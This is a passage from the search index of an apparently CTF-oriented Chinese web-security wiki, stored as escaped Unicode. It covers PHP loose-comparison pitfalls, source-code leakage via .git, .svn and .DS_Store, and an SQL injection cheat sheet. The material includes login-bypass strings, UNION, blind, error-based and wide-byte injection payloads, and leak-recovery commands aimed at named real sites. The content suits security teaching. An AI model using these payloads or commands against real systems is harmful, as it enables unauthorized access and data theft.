\u3002","title":"\u7c7b\u578b\u8f6c\u6362"},{"location":"web/php/#_17","text":"\u5185\u7f6e\u51fd\u6570\u7684\u677e\u6563\u6027\u8bf4\u7684\u662f\uff0c\u8c03\u7528\u51fd\u6570\u65f6\u7ed9\u51fd\u6570\u4f20\u9012\u51fd\u6570\u65e0\u6cd5\u63a5\u53d7\u7684\u53c2\u6570\u7c7b\u578b\u3002\u89e3\u91ca\u8d77\u6765\u6709\u70b9\u62d7\u53e3\uff0c\u8fd8\u662f\u76f4\u63a5\u901a\u8fc7\u5b9e\u9645\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u95ee\u9898\uff0c\u4e0b\u9762\u4f1a\u91cd\u70b9\u4ecb\u7ecd\u51e0\u4e2a\u8fd9\u79cd\u51fd\u6570\u3002 md5() $array1[] = array( \"foo\" => \"bar\", \"bar\" => \"foo\", ); $array2 = array(\"foo\", \"bar\", \"hello\", \"world\"); var_dump(md5($array1)==var_dump($array2)); //true PHP \u624b\u518c\u4e2d\u7684 md5\uff08\uff09\u51fd\u6570\u7684\u63cf\u8ff0\u662f string md5 ( string $str [, bool $raw_output = false ] ) \uff0c md5() \u4e2d\u7684\u9700\u8981\u662f\u4e00\u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u4f46\u662f\u5f53\u4f60\u4f20\u9012\u4e00\u4e2a array \u65f6\uff0c md5() \u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u662f\u4f1a\u65e0\u6cd5\u6b63\u786e\u5730\u6c42\u51fa array \u7684 md5 \u503c\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u4efb\u610f 2 \u4e2a array \u7684 md5 \u503c\u90fd\u4f1a\u76f8\u7b49\u3002 strcmp() strcmp() \u51fd\u6570\u5728 PHP \u5b98\u65b9\u624b\u518c\u4e2d\u7684\u63cf\u8ff0\u662f intstrcmp ( string $str1 \uff0c string $str2 ) \uff0c\u9700\u8981\u7ed9 strcmp() \u4f20\u9012 2 \u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u5982\u679c str1 \u5c0f\u4e8e str2 \uff0c\u8fd4\u56de -1\uff0c\u76f8\u7b49\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de 1\u3002 strcmp() \u51fd\u6570\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u672c\u8d28\u662f\u5c06\u4e24\u4e2a\u53d8\u91cf\u8f6c\u6362\u4e3a ASCII\uff0c\u7136\u540e\u8fdb\u884c\u51cf\u6cd5\u8fd0\u7b97\uff0c\u7136\u540e\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u6765\u51b3\u5b9a\u8fd4\u56de\u503c\u3002 \u5982\u679c\u4f20\u5165\u7ed9\u51fa strcmp() \u7684\u53c2\u6570\u662f\u6570\u5b57\u5462\uff1f $array=[1,2,3]; var_dump(strcmp($array,'123')); //null,\u5728\u67d0\u79cd\u610f\u4e49\u4e0anull\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8efalse\u3002 switch() \u5982\u679c switch() \u662f\u6570\u5b57\u7c7b\u578b\u7684 case \u7684\u5224\u65ad\u65f6\uff0cswitch \u4f1a\u5c06\u5176\u4e2d\u7684\u53c2\u6570\u8f6c\u6362\u4e3a int \u7c7b\u578b\u3002\u5982\u4e0b\uff1a $i =\"2abc\"; switch ($i) { case 0: case 1: case 2: echo \"i is less than 3 but not negative\"; break; case 3: echo \"i is 3\"; } \u8fd9\u4e2a\u65f6\u5019\u7a0b\u5e8f\u8f93\u51fa\u7684\u662f i is less than 3 but not negative \uff0c\u662f\u7531\u4e8e switch() \u51fd\u6570\u5c06 $i \u8fdb\u884c\u4e86\u7c7b\u578b\u8f6c\u6362\uff0c\u8f6c\u6362\u7ed3\u679c\u4e3a 2\u3002 in_array() \u5728 PHP \u624b\u518c\u4e2d\uff0c in_array() \u51fd\u6570\u7684\u89e3\u91ca\u662f bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) ,\u5982\u679cstrict\u53c2\u6570\u6ca1\u6709\u63d0\u4f9b\uff0c\u90a3\u4e48in_array\u5c31\u4f1a\u4f7f\u7528\u677e\u6563\u6bd4\u8f83\u6765\u5224\u65ad $needle \u662f\u5426\u5728 $haystack \u4e2d\u3002\u5f53 strince \u7684\u503c\u4e3a true \u65f6\uff0c in_array() \u4f1a\u6bd4\u8f83 needls \u7684\u7c7b\u578b\u548c haystack \u4e2d\u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c\u3002 $array=[0,1,2,'3']; var_dump(in_array('abc', $array)); //true var_dump(in_array('1bc', $array)); //true \u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u60c5\u51b5\u8fd4\u56de\u7684\u90fd\u662f true\uff0c\u56e0\u4e3a 'abc' \u4f1a\u8f6c\u6362\u4e3a 0\uff0c '1bc' \u8f6c\u6362\u4e3a 1\u3002 array_search() \u4e0e in_array() \u4e5f\u662f\u4e00\u6837\u7684\u95ee\u9898\u3002","title":"\u5185\u7f6e\u51fd\u6570\u7684\u53c2\u6570\u7684\u677e\u6563\u6027"},{"location":"web/php/#_18","text":"","title":"\u5bfb\u627e\u6e90\u4ee3\u7801\u5907\u4efd"},{"location":"web/php/#hg","text":"hg init \u65f6\u4f1a\u4ea7\u751f .hg \u6587\u4ef6\u3002 \u5229\u7528\u5de5\u5177 dvcs-ripper","title":"hg \u6e90\u7801\u6cc4\u9732"},{"location":"web/php/#git","text":".git \u76ee\u5f55\u5185\u6709\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u6587\u4ef6\uff0c\u5982\u679c\u90e8\u7f72\u65f6\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u53ef\u88ab\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002 /.git /.git/HEAD /.git/index /.git/config /.git/description GitHack python GitHack.py http://www.openssl.org/.git/ GitHacker\uff08\u53ef\u6062\u590d\u5b8c\u6574 Git \u4ed3\u5e93\uff09 python GitHacker.py http://www.openssl.org/.git/","title":"Git \u6e90\u7801\u6cc4\u9732"},{"location":"web/php/#ds_store","text":"Mac OS \u4e2d\u4f1a\u5305\u542b\u6709 .DS_Store \u6587\u4ef6\uff0c\u5305\u542b\u6587\u4ef6\u540d\u7b49\u4fe1\u606f\u3002 \u5229\u7528\u5de5\u5177 ds\uff3fstore\uff3fexp python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store hd.zj.qq.com/ \u2514\u2500\u2500 themes \u2514\u2500\u2500 galaxyw \u251c\u2500\u2500 app \u2502 \u2514\u2500\u2500 css \u2502 \u2514\u2500\u2500 style.min.css \u251c\u2500\u2500 cityData.min.js \u251c\u2500\u2500 images \u2502 \u2514\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-hd.png \u2502 \u251c\u2500\u2500 bg-item-activity.png \u2502 \u251c\u2500\u2500 bg-masker-pop.png \u2502 \u251c\u2500\u2500 btn-bm.png \u2502 \u251c\u2500\u2500 btn-login-qq.png \u2502 \u251c\u2500\u2500 btn-login-wx.png \u2502 \u251c\u2500\u2500 ico-add-pic.png \u2502 \u251c\u2500\u2500 ico-address.png \u2502 \u251c\u2500\u2500 ico-bm.png \u2502 \u251c\u2500\u2500 ico-duration-time.png \u2502 \u251c\u2500\u2500 ico-pop-close.png \u2502 \u251c\u2500\u2500 ico-right-top-delete.png \u2502 \u251c\u2500\u2500 page-login-hd.png \u2502 \u251c\u2500\u2500 pic-masker.png \u2502 \u2514\u2500\u2500 ticket-selected.png \u2514\u2500\u2500 member \u251c\u2500\u2500 assets \u2502 \u251c\u2500\u2500 css \u2502 \u2502 \u251c\u2500\u2500 ace-reset.css \u2502 \u2502 \u2514\u2500\u2500 antd.css \u2502 \u2514\u2500\u2500 lib \u2502 \u251c\u2500\u2500 cityData.min.js \u2502 \u2514\u2500\u2500 ueditor \u2502 \u251c\u2500\u2500 index.html \u2502 \u251c\u2500\u2500 lang \u2502 \u2502 \u2514\u2500\u2500 zh-cn \u2502 \u2502 \u251c\u2500\u2500 images \u2502 \u2502 \u2502 \u251c\u2500\u2500 copy.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 localimage.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 music.png \u2502 \u2502 \u2502 \u2514\u2500\u2500 upload.png \u2502 \u2502 \u2514\u2500\u2500 zh-cn.js \u2502 \u251c\u2500\u2500 php \u2502 \u2502 \u251c\u2500\u2500 action_crawler.php \u2502 \u2502 \u251c\u2500\u2500 action_list.php \u2502 \u2502 \u251c\u2500\u2500 action_upload.php \u2502 \u2502 \u251c\u2500\u2500 config.json \u2502 \u2502 \u251c\u2500\u2500 controller.php \u2502 \u2502 \u2514\u2500\u2500 Uploader.class.php \u2502 \u251c\u2500\u2500 ueditor.all.js \u2502 \u251c\u2500\u2500 ueditor.all.min.js \u2502 \u251c\u2500\u2500 ueditor.config.js \u2502 \u251c\u2500\u2500 ueditor.parse.js \u2502 \u2514\u2500\u2500 ueditor.parse.min.js \u2514\u2500\u2500 static \u251c\u2500\u2500 css \u2502 \u2514\u2500\u2500 page.css \u251c\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-table-title.png \u2502 \u251c\u2500\u2500 bg-tab-say.png \u2502 \u251c\u2500\u2500 ico-black-disabled.png \u2502 \u251c\u2500\u2500 ico-black-enabled.png \u2502 \u251c\u2500\u2500 ico-coorption-person.png \u2502 \u251c\u2500\u2500 ico-miss-person.png \u2502 \u251c\u2500\u2500 ico-mr-person.png \u2502 \u251c\u2500\u2500 ico-white-disabled.png \u2502 \u2514\u2500\u2500 ico-white-enabled.png \u2514\u2500\u2500 scripts \u251c\u2500\u2500 js \u2514\u2500\u2500 lib \u2514\u2500\u2500 jquery.min.js 21 directories, 48 files","title":".DS_Store \u6587\u4ef6\u6cc4\u9732"},{"location":"web/php/#_19","text":"\u7ba1\u7406\u5458\u5907\u4efd\u7f51\u7ad9\u6587\u4ef6\u540e\u9519\u8bef\u5730\u5c06\u5907\u4efd\u653e\u5728 Web \u76ee\u5f55\u4e0b\u3002 \u5e38\u89c1\u7684\u540e\u7f00\u540d\uff1a .rar .zip .7z .tar .tar.gz .bak .txt","title":"\u7f51\u7ad9\u5907\u4efd\u6587\u4ef6"},{"location":"web/php/#svn","text":"\u654f\u611f\u6587\u4ef6\uff1a /.svn /.svn/wc.db /.svn/entries dvcs-ripper perl rip-svn.pl -v -u http://www.example.com/.svn/ Seay - SVN","title":"SVN \u6cc4\u9732"},{"location":"web/php/#web-inf-webxml","text":"WEB-INF \u662f Java Web \u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0cweb.xml \u4e2d\u6709\u6587\u4ef6\u7684\u6620\u5c04\u5173\u7cfb\u3002 WEB-INF \u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a /WEB-INF/web.xml \uff1aWeb \u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\uff0c\u63cf\u8ff0\u4e86 servlet \u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219\u3002 /WEB-INF/classes/ \uff1a\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7528\u7684 class \u6587\u4ef6\uff0c\u5305\u62ec servlet class \u548c\u975e servlet class\uff0c\u4ed6\u4eec\u4e0d\u80fd\u5305\u542b\u5728\u3002jar \u6587\u4ef6\u4e2d\u3002 /WEB-INF/lib/ \uff1a\u5b58\u653e web \u5e94\u7528\u9700\u8981\u7684\u5404\u79cd JAR \u6587\u4ef6\uff0c\u653e\u7f6e\u4ec5\u5728\u8fd9\u4e2a\u5e94\u7528\u4e2d\u8981\u6c42\u4f7f\u7528\u7684 jar \u6587\u4ef6\uff0c\u5982\u6570\u636e\u5e93\u9a71\u52a8 jar \u6587\u4ef6\u3002 /WEB-INF/src/ \uff1a\u6e90\u7801\u76ee\u5f55\uff0c\u6309\u7167\u5305\u540d\u7ed3\u6784\u653e\u7f6e\u5404\u4e2a java \u6587\u4ef6\u3002 /WEB-INF/database.properties \uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3002 \u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u5728\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002 \u4e00\u822c\u60c5\u51b5\uff0cjsp \u5f15\u64ce\u9ed8\u8ba4\u90fd\u662f\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u7684\uff0cNginx \u914d\u5408 Tomcat \u505a\u5747\u8861\u8d1f\u8f7d\u6216\u96c6\u7fa4\u7b49\u60c5\u51b5\u65f6\uff0c\u95ee\u9898\u539f\u56e0\u5176\u5b9e\u5f88\u7b80\u5355\uff0cNginx \u4e0d\u4f1a\u53bb\u8003\u8651\u914d\u7f6e\u5176\u4ed6\u7c7b\u578b\u5f15\u64ce\uff08Nginx \u4e0d\u662f jsp \u5f15\u64ce\uff09\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u800c\u5f15\u5165\u5230\u81ea\u8eab\u7684\u5b89\u5168\u89c4\u8303\u4e2d\u6765\uff08\u8fd9\u6837\u8026\u5408\u6027\u592a\u9ad8\u4e86\uff09\uff0c\u4fee\u6539 Nginx \u914d\u7f6e\u6587\u4ef6\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u5c31\u597d\u4e86\uff1a location ~ ^/WEB-INF/* { deny all ; } # \u6216\u8005return 404; \u6216\u8005\u5176\u4ed6\uff01","title":"WEB-INF / web.xml \u6cc4\u9732"},{"location":"web/php/#cvs","text":"http://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f http://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784 \u53d6\u56de\u6e90\u7801 bk clone http://url/name dir","title":"CVS \u6cc4\u9732"},{"location":"web/sqli/","text":"\u57fa\u672c\u6982\u5ff5 \u00b6 SQL \u6ce8\u5165\u662f\u4e00\u79cd\u5c06 SQL \u4ee3\u7801\u63d2\u5165\u6216\u6dfb\u52a0\u5230\u5e94\u7528\uff08\u7528\u6237\uff09\u7684\u8f93\u5165\u53c2\u6570\u4e2d\uff0c\u4e4b\u540e\u518d\u8bb2\u8fd9\u4e9b\u53c2\u6570\u4f20\u9012\u7ed9\u540e\u53f0\u7684 SQL \u670d\u52a1\u5668\u52a0\u4ee5\u89e3\u6790\u5e76\u6267\u884c\u7684\u653b\u51fb\u3002 \u653b\u51fb\u8005\u80fd\u591f\u4fee\u6539 SQL \u8bed\u53e5\uff0c\u8be5\u8fdb\u7a0b\u5c06\u4e0e\u6267\u884c\u547d\u4ee4\u7684\u7ec4\u4ef6\uff08\u5982\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u5e94\u7528\u670d\u52a1\u5668\u6216 WEB \u670d\u52a1\u5668\uff09\u62e5\u6709\u76f8\u540c\u7684\u6743\u9650\u3002 \u5982\u679c WEB \u5e94\u7528\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u786e\u4fdd\u5728\u5c06\u4ece WEB \u8868\u5355\u3001cookie\u3001\u8f93\u5165\u53c2\u6570\u7b49\u6536\u5230\u7684\u503c\u4f20\u9012\u7ed9 SQL \u67e5\u8be2\uff08\u8be5\u67e5\u8be2\u5728\u6570\u636e\u5e93\u670d\u52a1\u5668\u4e0a\u6267\u884c\uff09\u4e4b\u524d\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u8fc7\u9a8c\u8bc1\uff0c\u901a\u5e38\u5c31\u4f1a\u51fa\u73b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u3002 \u5e38\u7528\u5de5\u5177 \u00b6 Burp Suite\uff1a Burp Suite \u4f7f\u7528\u4ecb\u7ecd Tamper Data (Firefox addon) HackBar (Firefox addon) sqlmap\uff1a sqlmap \u7528\u6237\u624b\u518c \u6ce8\u5165\u5e38\u89c1\u53c2\u6570 \u00b6 user() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237 database() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u540d version() \uff1a\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u7248\u672c @@datadir \uff1a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u8def\u5f84 concat() \uff1a\u8054\u5408\u6570\u636e\uff0c\u7528\u4e8e\u8054\u5408\u4e24\u6761\u6570\u636e\u7ed3\u679c\u3002\u5982 concat(username,0x3a,password) group_concat() \uff1a\u548c concat() \u7c7b\u4f3c\uff0c\u5982 group_concat(DISTINCT+user,0x3a,password) \uff0c\u7528\u4e8e\u628a\u591a\u6761\u6570\u636e\u4e00\u6b21\u6ce8\u5165\u51fa\u6765 concat_ws() \uff1a\u7528\u6cd5\u7c7b\u4f3c hex() \u548c unhex() \uff1a\u7528\u4e8e hex \u7f16\u7801\u89e3\u7801 load_file() \uff1a\u4ee5\u6587\u672c\u65b9\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u5728 Windows \u4e2d\uff0c\u8def\u5f84\u8bbe\u7f6e\u4e3a \\\\ select xxoo into outfile '\u8def\u5f84' \uff1a\u6743\u9650\u8f83\u9ad8\u65f6\u53ef\u76f4\u63a5\u5199\u6587\u4ef6 \u8bed\u6cd5\u53c2\u8003\u4e0e\u5c0f\u6280\u5de7 \u00b6 \u884c\u95f4\u6ce8\u91ca \u00b6 -- DROP sampletable ; -- # DROP sampletable ; # \u884c\u5185\u6ce8\u91ca \u00b6 /*\u6ce8\u91ca\u5185\u5bb9*/ DROP /*comment*/ sampletable ` DR /**/ OP /*\u7ed5\u8fc7\u8fc7\u6ee4*/ sampletable ` SELECT /*\u66ff\u6362\u7a7a\u683c*/ password /**/ FROM /**/ Members /*! MYSQL\u4e13\u5c5e */ SELECT /*!32302 1/0, */ 1 FROM tablename \u5b57\u7b26\u4e32\u7f16\u7801 \u00b6 ASCII() \uff1a\u8fd4\u56de\u5b57\u7b26\u7684 ASCII \u7801\u503c CHAR() \uff1a\u628a\u6574\u6570\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26 \u540e\u53f0\u4e07\u80fd\u5bc6\u7801 \u00b6 admin' -- admin' # admin'/* ' or 1=1-- ' or 1=1# ' or 1=1/* ') or '1'='1-- ') or ('1'='1-- \u4ee5\u4e0d\u540c\u7684\u7528\u6237\u767b\u9646 ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1-- \u6ce8\u5165\u8bed\u53e5\u5907\u5fd8 \u00b6 \u6570\u636e\u5e93\u540d \u00b6 SELECT database (); SELECT schema_name FROM information_schema . schemata ; \u8868\u540d \u00b6 union \u67e5\u8be2 --MySQL 4\u7248\u672c\u65f6\u7528version=9\uff0cMySQL 5\u7248\u672c\u65f6\u7528version=10 UNION SELECT GROUP_CONCAT ( table_name ) FROM information_schema . tables WHERE version = 10 ; /* \u5217\u51fa\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u7684\u8868 */ UNION SELECT TABLE_NAME FROM information_schema . tables WHERE TABLE_SCHEMA = database (); /* \u5217\u51fa\u6240\u6709\u7528\u6237\u81ea\u5b9a\u4e49\u6570\u636e\u5e93\u4e2d\u7684\u8868 */ SELECT table_schema , table_name FROM information_schema . tables WHERE table_schema != 'information_schema' AND table_schema != 'mysql' ; \u76f2\u6ce8 AND SELECT SUBSTR ( table_name , 1 , 1 ) FROM information_schema . tables > 'A' \u62a5\u9519 AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT table_name FROM information_schema . tables LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT table_name FROM information_schema . tables LIMIT 1 ))); -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f\u3002 \u5217\u540d \u00b6 union \u67e5\u8be2 UNION SELECT GROUP_CONCAT ( column_name ) FROM information_schema . columns WHERE table_name = 'tablename' \u76f2\u6ce8 AND SELECT SUBSTR ( column_name , 1 , 1 ) FROM information_schema . columns > 'A' \u62a5\u9519 -- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f AND ( 1 , 2 , 3 ) = ( SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1 , 2 , 3 LIMIT 1 ) -- MySQL 5.1\u7248\u672c\u4fee\u590d\u4e86 AND ( SELECT COUNT ( * ) FROM ( SELECT 1 UNION SELECT null UNION SELECT ! 1 ) x GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), FLOOR ( RAND ( 0 ) * 2 ))) ( @ : = 1 ) ||@ GROUP BY CONCAT (( SELECT column_name FROM information_schema . columns LIMIT 1 ), !@ ) HAVING @|| MIN ( @ : = 0 ); AND ExtractValue ( 1 , CONCAT ( 0 x5c , ( SELECT column_name FROM information_schema . columns LIMIT 1 ))); \u5229\u7528 PROCEDURE ANALYSE() -- \u8fd9\u4e2a\u9700\u8981 web \u5c55\u793a\u9875\u9762\u6709\u4f60\u6240\u6ce8\u5165\u67e5\u8be2\u7684\u4e00\u4e2a\u5b57\u6bb5 -- \u83b7\u5f97\u7b2c\u4e00\u4e2a\u6bb5\u540d SELECT username , permission FROM Users WHERE id = 1 ; 1 PROCEDURE ANALYSE () -- \u83b7\u5f97\u7b2c\u4e8c\u4e2a\u6bb5\u540d 1 LIMIT 1 , 1 PROCEDURE ANALYSE () -- \u83b7\u5f97\u7b2c\u4e09\u4e2a\u6bb5\u540d 1 LIMIT 2 , 1 PROCEDURE ANALYSE () \u6839\u636e\u5217\u540d\u67e5\u8be2\u6240\u5728\u7684\u8868 \u00b6 -- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e3a username \u7684\u8868 SELECT table_name FROM information_schema . columns WHERE column_name = 'username' ; -- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e2d\u5305\u542b username \u7684\u8868 SELECT table_name FROM information_schema . columns WHERE column_name LIKE '%user%' ; \u7ed5\u8fc7\u5f15\u53f7\u9650\u5236 \u00b6 -- hex \u7f16\u7801 SELECT * FROM Users WHERE username = 0 x61646D696E -- char() \u51fd\u6570 SELECT * FROM Users WHERE username = CHAR ( 97 , 100 , 109 , 105 , 110 ) \u7ed5\u8fc7\u5b57\u7b26\u4e32\u9ed1\u540d\u5355 \u00b6 SELECT 'a' 'd' 'mi' 'n' ; SELECT CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT CONCAT_WS ( '' , 'a' , 'd' , 'm' , 'i' , 'n' ); SELECT GROUP_CONCAT ( 'a' , 'd' , 'm' , 'i' , 'n' ); \u4f7f\u7528 CONCAT() \u65f6\uff0c\u4efb\u4f55\u4e2a\u53c2\u6570\u4e3a null\uff0c\u5c06\u8fd4\u56de null\uff0c\u63a8\u8350\u4f7f\u7528 CONCAT_WS() \u3002 CONCAT_WS() \u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u7528\u54ea\u4e2a\u5b57\u7b26\u95f4\u9694\u6240\u67e5\u8be2\u7684\u7ed3\u679c\u3002 \u6761\u4ef6\u8bed\u53e5 \u00b6 CASE , IF() , IFNULL() , NULLIF() . SELECT IF ( 1 = 1 , true , false ); SELECT CASE WHEN 1 = 1 THEN true ELSE false END ; \u5ef6\u65f6\u51fd\u6570 \u00b6 SLEEP() , BENCHMARK() . ' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(' true ')), false)) - ' order by \u540e\u7684\u6ce8\u5165 \u00b6 order by \u7531\u4e8e\u662f\u6392\u5e8f\u8bed\u53e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u6761\u4ef6\u8bed\u53e5\u505a\u5224\u65ad\uff0c\u6839\u636e\u8fd4\u56de\u7684\u6392\u5e8f\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u6761\u4ef6\u7684\u771f\u5047\u3002\u4e00\u822c\u5e26\u6709 order \u6216\u8005 order by \u7684\u53d8\u91cf\u5f88\u53ef\u80fd\u662f\u8fd9\u79cd\u6ce8\u5165\uff0c\u5728\u77e5\u9053\u4e00\u4e2a\u5b57\u6bb5\u7684\u65f6\u5019\u53ef\u4ee5\u91c7\u7528\u5982\u4e0b\u65b9\u5f0f\u6ce8\u5165\uff1a \u539f\u59cb\u94fe\u63a5\uff1a http://www.test.com/list.php?order=vote \u6839\u636e vote \u5b57\u6bb5\u6392\u5e8f\u3002\u627e\u5230\u6295\u7968\u6570\u6700\u5927\u7684\u7968\u6570 num \u7136\u540e\u6784\u9020\u4ee5\u4e0b\u94fe\u63a5\uff1a http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc \u770b\u6392\u5e8f\u662f\u5426\u53d8\u5316\u3002\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u4e0d\u9700\u8981\u77e5\u9053\u4efb\u4f55\u5b57\u6bb5\u4fe1\u606f\uff0c\u4f7f\u7528 rand \u51fd\u6570\uff1a http://www.test.com/list.php?order=rand(true) http://www.test.com/list.php?order=rand(false) \u4ee5\u4e0a\u4e24\u4e2a\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u6392\u5e8f\uff0c\u5224\u65ad\u8868\u540d\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u5c0f\u4e8e 128 \u7684\u8bed\u53e5\u5982\u4e0b\uff1a http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128)) \u5bbd\u5b57\u8282\u6ce8\u5165 \u00b6 \u56fd\u5185\u6700\u5e38\u4f7f\u7528\u7684 GBK \u7f16\u7801\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e3b\u8981\u662f\u7ed5\u8fc7 addslashes \u7b49\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u79fb\u7684\u7ed5\u8fc7\u3002\u53cd\u659c\u6760 \\ \u7684\u5341\u516d\u8fdb\u5236\u4e3a %5c \uff0c\u5728\u4f60\u8f93\u5165 %bf%27 \u65f6\uff0c\u51fd\u6570\u9047\u5230\u5355\u5f15\u53f7\u81ea\u52a8\u8f6c\u79fb\u52a0\u5165 \\ \uff0c\u6b64\u65f6\u53d8\u4e3a %bf%5c%27 \uff0c %bf%5c \u5728 GBK \u4e2d\u53d8\u4e3a\u4e00\u4e2a\u5bbd\u5b57\u7b26\u300c\u7e17\u300d\u3002 %bf \u90a3\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u662f %81-%fe \u4e2d\u95f4\u7684\u4efb\u4f55\u5b57\u7b26\u3002\u4e0d\u6b62\u5728 SQL \u6ce8\u5165\u4e2d\uff0c\u5bbd\u5b57\u7b26\u6ce8\u5165\u5728\u5f88\u591a\u5730\u65b9\u90fd\u53ef\u4ee5\u5e94\u7528\u3002 \u53c2\u8003\u8d44\u6599 \u00b6 SQL \u6ce8\u5165\u901f\u67e5\u8868 MySQL \u6ce8\u5165\u6280\u5de7 MySQL \u6ce8\u5165\u79d1\u666e MySQL \u6ce8\u5165\u603b\u7ed3 \u300aSQL \u6ce8\u5165\u653b\u51fb\u4e0e\u9632\u5fa1\u300b","title":"SQL \u6ce8\u5165"},{"location":"web/sqli/#_1","text":"SQL \u6ce8\u5165\u662f\u4e00\u79cd\u5c06 SQL \u4ee3\u7801\u63d2\u5165\u6216\u6dfb\u52a0\u5230\u5e94\u7528\uff08\u7528\u6237\uff09\u7684\u8f93\u5165\u53c2\u6570\u4e2d\uff0c\u4e4b\u540e\u518d\u8bb2\u8fd9\u4e9b\u53c2\u6570\u4f20\u9012\u7ed9\u540e\u53f0\u7684 SQL \u670d\u52a1\u5668\u52a0\u4ee5\u89e3\u6790\u5e76\u6267\u884c\u7684\u653b\u51fb\u3002 \u653b\u51fb\u8005\u80fd\u591f\u4fee\u6539 SQL \u8bed\u53e5\uff0c\u8be5\u8fdb\u7a0b\u5c06\u4e0e\u6267\u884c\u547d\u4ee4\u7684\u7ec4\u4ef6\uff08\u5982\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u5e94\u7528\u670d\u52a1\u5668\u6216 WEB \u670d\u52a1\u5668\uff09\u62e5\u6709\u76f8\u540c\u7684\u6743\u9650\u3002 \u5982\u679c WEB \u5e94\u7528\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u786e\u4fdd\u5728\u5c06\u4ece WEB \u8868\u5355\u3001cookie\u3001\u8f93\u5165\u53c2\u6570\u7b49\u6536\u5230\u7684\u503c\u4f20\u9012\u7ed9 SQL \u67e5\u8be2\uff08\u8be5\u67e5\u8be2\u5728\u6570\u636e\u5e93\u670d\u52a1\u5668\u4e0a\u6267\u884c\uff09\u4e4b\u524d\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u8fc7\u9a8c\u8bc1\uff0c\u901a\u5e38\u5c31\u4f1a\u51fa\u73b0 SQL 